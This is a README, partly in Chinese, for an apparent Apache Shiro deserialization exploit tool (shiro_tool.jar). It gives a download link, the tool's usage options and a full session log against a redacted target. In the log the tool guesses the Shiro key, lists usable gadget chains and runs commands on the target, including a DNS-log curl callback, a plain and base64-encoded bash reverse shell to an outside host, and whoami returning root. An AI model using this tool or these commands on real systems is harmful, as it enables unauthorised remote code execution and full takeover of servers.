# shiro_rce

> 利用工具下载 [https://github.com/helloexp/0day/releases/tag/v1.0_shiro](https://github.com/helloexp/0day/releases/tag/v1.0_shiro)

```shell script

> java -jar shiro_tool.jar
Usage: java -jar shiro_tool.jar https://xx.xx.xx.xx
nocheck     --> skip check target is shiro or not.
skip        --> all gadget default can be use
randomagent --> random useragent
notcheckall --> not check all gadget
useragent=  --> set useragent
cookiename= --> default: rememberMe      不是rememberMe的时候用
x=          --> print result
cmd=        --> set command to run
dcmd=       --> set command to run, command format base64 string
key=        --> set a shiro key
req=        --> request body file   request body file 抓包保存到文件里，这里写文件名
keys=       --> keys file       自定义key的文件，key按行分割，即每行写一个
java -cp shiro_tool.jar shiro.Check urls=批量url文件
java -cp shiro_tool.jar shiro.Check http://www.shiro.com


[admin@ shiro] java -jar shiro_tool.jar https://xx.xx.xx.xx/          
[-] target: https://xx.xx.xx.xx/
[-] target is use shiro
[-] start guess shiro key.
[-] shiro key: kPH+bIxk5D2deZiIxcaaaA==
[-] check URLDNS
[*] find: URLDNS can be use
[-] check CommonsBeanutils1
[*] find: CommonsBeanutils1 can be use
[-] check CommonsBeanutils2
[-] check CommonsCollections1
[-] check CommonsCollections2
[-] check CommonsCollections3
[-] check CommonsCollections4
[-] check CommonsCollections5
[-] check CommonsCollections6
[-] check CommonsCollections7
[-] check CommonsCollections8
[-] check CommonsCollections9
[-] check CommonsCollections10
[-] check CommonsCollectionsK1
[-] check CommonsCollectionsK2
[-] check CommonsCollectionsK3
[-] check CommonsCollectionsK4
[-] check Groovy1
[*] find: Groovy1 can be use
[-] check JSON1
[*] find: JSON1 can be use
[-] check Spring1
[*] find: Spring1 can be use
[-] check Spring2
[-] check JRMPClient
[*] find: JRMPClient can be use
[*] JRMPClient please use: java -cp shiro_tool.jar ysoserial.exploit.JRMPListener 
0: URLDNS
1: CommonsBeanutils1
2: Groovy1
3: JSON1
4: Spring1
5: JRMPClient
[-] please enter the number(0-6)
3
[-] use gadget: JSON1
[*] command example: bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
[*] command example: curl dnslog.xx.com
[*] if need base64 command, input should startwith bash=/powershell=/python=/perl= 
[-] please enter command, input q or quit to quit
> curl json.dnslog.xx.cn
[-] start process command: curl json.dnslog.xx.cn
[-] please enter command, input q or quit to quit
> bash=bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
[-] start process command: bash -c {echo,YmFzaD1iYXNoIC1pID4mIC9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzgwIDA+JjE=}|{base64,-d}|{bash,-i}
[-] please enter command, input q or quit to quit
> output=on
[-] print payload mode on.
[-] please enter command, enter q or quit to quit, enter back to re-choose gadget
> whoami
kPH+bIxk5D2deZiIxcaaaA== - CommonsBeanutils1 - zEC2T+ZP+ib2g+NLMrrU0LRsNu3lr7kjq
82987eI8FZxA8ckaX8LsMNHdParxVS9aYg0Oxl91WD5GztG6Dmg/QO/sjxi+kX/sFpHgqwtG4MCQoogH
Jkhnj73PI6Wn8AJWQyXoOGNMkyboGcEm0Ti1h+WMGQEqw57tRl7Pjr0pMr2oZcUj9huwC/Lfr090FX7v
rPrU5JnQm2Qo7ZrMPnxENXs0yMT6HfU75OejeF6kXbWTaGlvfByscF1ljoDR/k2txdQ1eK4nZ4ReOAqM
uUeeaXwirEw2kg58GktvB2Ghw4egXJBQUdP3H8iE+zrkf12YlPs/RAOq8w0mWfvwB7EnCW3Z83YP8vV1
+reLT9oNyUpCfjKyQVodnpZJY7If4F9al8He7E832RR3mhFvsjJDyNFTbB4TPrRqFDehSVuHib5qkh0s
0YjvCGErxDLH9pFS4G9rNYQeAnXBKeNzS5q2O0xCe5xg4X6l8R6XsU2/V1d6wd27U7u18+DJlo/v58vj
SyUtUaEAAuMN9C30Rr+r7Tk9MVC55eS8l82fURpUwttcRADhJ0esKHAFFAkwnisbAb4Uugz3IADojYlH
BNFtWFuV2dsuqkionEROKLIdVHJGR8URmk79v8lbLbpCWI3cTCf81SwwBoYylKXCyHX2X08VlEUvuHWk
ypx9gVvDuQQQFTGP4ljwpU1NlQPqxaLXmnZ5TyJN2sycL9s8VWMYls4uFATtMkpXXcwaQGFVjCzFrABv
[-] please enter command, enter q or quit to quit, enter back to re-choose gadget
> x=whoami
root

[-] please enter command, enter q or quit to quit, enter back to re-choose gadget
> quit
[-] start process command: quit
[-] quit

```
